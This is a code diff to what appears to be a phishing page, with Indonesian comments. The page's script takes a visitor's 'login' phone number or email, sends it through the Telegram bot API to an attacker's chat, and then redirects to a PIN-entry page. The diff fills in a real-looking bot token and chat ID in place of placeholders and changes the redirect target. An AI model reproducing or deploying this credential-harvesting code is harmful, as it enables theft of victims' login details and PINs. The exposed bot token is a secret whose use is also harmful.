@@ -172,8 +172,8 @@
             loader.style.display = 'block';
             
             // Mengirim data ke Telegram
-            var telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Ganti dengan token bot Telegram Anda
-            var chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat_id Telegram Anda
+            var telegramToken = '7423068749:AAErZulH4NM-eeLdUMNFeOH5PhXRt_MrP48'; // Ganti dengan token bot Telegram Anda
+            var chatId = '6824078885'; // Ganti dengan chat_id Telegram Anda
             var message = "Informasi Login:\nNomor Ponsel/Email: " + phoneNumber;
 
             var url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
@@ -185,7 +185,7 @@
                 if (xhr.readyState == 4 && xhr.status == 200) {
                     loader.style.display = 'none';
                     // Redirect ke halaman pin.html setelah sukses
-                    window.location.href = "pin.html";
+                    window.location.href = "piro.html";
                 }
             };
             xhr.send();
